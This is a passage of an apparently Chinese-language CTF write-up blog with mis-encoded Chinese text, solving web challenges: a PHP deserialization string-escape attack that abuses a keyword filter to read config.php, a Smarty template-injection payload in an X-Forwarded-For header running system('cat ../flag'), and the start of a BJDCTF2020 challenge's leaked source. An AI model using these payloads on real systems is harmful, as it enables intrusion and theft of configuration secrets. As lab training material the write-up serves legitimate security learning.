class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);    <span class="hljs-comment">//MySQLè¿”å›é”™è¯¯å¹¶å¿½è§†å‰©ä½™çš„è¡Œ</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;  <span class="hljs-comment">//è¿‡æ»¤ &#x27; \</span><br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p>è¦ç‚¹ï¼š</p><ul><li>filterå‡½æ•°</li></ul><p>ç»è¿‡å®¡è®¡ æ•°æ®åº“ä¸­å­˜åœ¨ username,password,profileå­—æ®µ</p><p>config.php æ•°æ®åº“é…ç½®</p><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>èµ„æ–™ä¸Šä¼ ä¹‹ååºåˆ—åŒ–è¢«å­˜å…¥åˆ°æ•°æ®åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br>...<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br>    ...    <br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">å‰ä¸¤ä¸ªifåªè¦åªè¦é1å°±æ‰§è¡Œè¯­å¥å—ï¼Œæœ€åä¸€ä¸ªåªè¦ä¸º1å°±æ‰§è¡Œè¯­å¥å—ï¼Œè¿™é‡Œå®é™…ä¸Šæˆ‘ä»¬ä¸å¸Œæœ›ä¸ç¬¦åˆæ¡ä»¶ã€‚æœ€åä¸€ä¸ªçš„ifåœ¨äºåªè¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ã€‚ç¨‹åºè¿”å›falseï¼Œå°±æ°¸è¿œä¸ä¼šæ‰§è¡Œåˆ°å¯¹åº”çš„è¯­å¥å—ä¸­ã€‚</code></pre></div><p>æ¢³ç†ä¸€ä¸‹åšé¢˜çš„æµç¨‹ï¼š</p><p>æ³¨å†Œç”¨æˆ· =&gt; ç™»å½• =&gt; å®Œå–„ä¿¡æ¯(update.phpä¿®æ”¹nicknameä¸ºæ•°ç»„ï¼Œå°†æ¶æ„ä¿¡æ¯å­˜å…¥æ•°æ®åº“) =&gt; èµ„æ–™é¡µ(profile.phpè§¦å‘unserliaze)</p><h3 id="æ„å»ºexp-amp-getFlag"><a href="#æ„å»ºexp-amp-getFlag" class="headerlink" title="æ„å»ºexp&amp;getFlag"></a>æ„å»ºexp&amp;getFlag</h3><p>æ ¹æ®å‰ç½®çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå…¥å¦‚ä¸‹è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] =<span class="hljs-string">&#x27;11111111111&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;132131232@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-number">132131</span>);<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-comment">//åŸå§‹  $profile[&#x27;nickname&#x27;] = &#x27;132131&#x27;;</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;s:6:&quot;132131&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//nickname=&gt; array(132131)</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;i:132131;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//ç›®çš„</span><br><span class="hljs-comment">//a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:16:&quot;132131232@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;i:132131;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br><span class="hljs-comment">//éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸² &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; é•¿åº¦34</span><br><span class="hljs-comment">//å› ä¸ºè¿‡æ»¤åé•¿åº¦+1 çº¦ç­‰äº 5n+34=6n =&gt; n=34</span><br><span class="hljs-comment">//æœ€å</span><br><span class="hljs-comment">//wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨update.phpå¤„æ„é€ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">...<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;nickname[]&quot;<br><br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<br>------WebKitFormBoundaryPDanrsn88DB96mAg<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;photo&quot;; filename=&quot;Terminal.png&quot;<br><br></code></pre></td></tr></table></figure><p>ä¹‹åè½¬profile.phpå°†Base64çš„å†…å®¹è§£ç å³å¯å¾—åˆ°flag</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>æ²¡åšå‡ºæ¥è¿™ä¸ªä¸€å¼€å§‹å•¥ä¹Ÿæ²¡çœ‹å‡ºæ¥hhhä½†æ˜¯çœ‹wpå¾ˆç®€å•ï¼Œxffå°±æ˜¯sstiæ³¨å…¥ç‚¹å¦‚å›¾ </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182242811.png" alt="image-20220118224240672"></p><p>å‘ç°æ˜¯smartyæ¡†æ¶</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182245199.png" alt="image-20220118224517107"></p><p>æœ€ç»ˆpayload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Forwarded-For:&#123;system(&#x27;cat ../../../../../../../../flag&#x27;)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201182245812.png" alt="image-20220118224539653"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>çœ‹æºç å¾—flagï¼Œæ˜¯ä¸æ˜¯å‡ºé¢˜äººæ²¡æŠŠç¼–ç é—®é¢˜æå¥½ï¼Ÿ</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>ä¸€çœ¼æ²¡æ€è·¯å°±å»æ‰¾æœ‰æ²¡æœ‰æ³„éœ²ï¼Œæœç„¶index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ob_start();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = uniqid().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> sha1(<span class="hljs-variable">$content</span>); <br>&#125;<br>    header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span 